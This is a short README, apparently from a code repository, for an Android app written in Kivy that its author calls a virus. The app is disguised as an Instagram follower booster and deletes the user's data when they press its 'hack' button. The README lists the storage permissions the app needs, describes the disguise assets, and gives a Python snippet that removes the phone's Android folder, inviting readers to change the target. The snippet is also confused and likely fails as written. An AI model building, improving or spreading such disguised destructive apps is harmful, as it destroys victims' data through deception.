# kivy-virus
A virus that will delete a person's data disguised as an instagram followers increaser
This code contains several useless blocks of code that i forgot to omit but it shouldn't be a problem 
and also  i uploaded the spec file and all the permissions in it the permission are READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE those are the only required permissions 
i uploaded the splash screen image named code9.png and also the app icon named code7.jpeg and a background_image named code3.png you can change all those if you want in the spec file and the .py file 
i didn't use any .kv file as i hate that
the app will delete the android folder on the phone but you  can change that in this code 
if os.path.isdir('/storage/emulated/0/Alarms')==True:
    os.rmdir('/storage/emulated/0/Android')
you can just replace it with another file
the app will delete the data after the hack button is pressed
